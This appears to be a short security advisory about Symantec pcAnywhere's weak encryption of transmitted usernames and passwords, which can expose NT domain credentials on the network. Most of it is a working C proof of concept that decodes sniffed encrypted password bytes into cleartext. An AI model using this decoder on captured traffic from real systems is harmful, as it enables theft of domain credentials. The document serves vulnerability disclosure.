Symantec pcAnywhere is shipped by default with a weak encryption scheme that is used to encrypt username and password transmittal. Therefore, usernames and password can be retrieved by anyone sniffing the network in between the host computer running pcAnywhere and the NT domain controller.

Users of pcAnywhere can be authenticated with their NT domain username and password. In this case, the weakly encrypted transmitted authentication would be transmitted domain wide.

#include <stdio.h>
#include <string.h>

void main() {

  char password[128];
  char cleartext[128];
  int	 i;

  // input the sniffed hex values here
  // Encrypted example of the 'aaaaa' password
  password[0]=0xca;
  password[1]=0xab;
  password[2]=0xcb;
  password[3]=0xa8;
  password[4]=0xca;
  password[5]='\0';

	cleartext[0]=0xca-password[0]+0x61;
	for (i=1;i<strlen(password);i++)
	  cleartext[i] = password[i-1] ^ password[i] ^ i-1;

	cleartext[strlen(password)]='\0';

	printf("password is %s \n",cleartext);

}
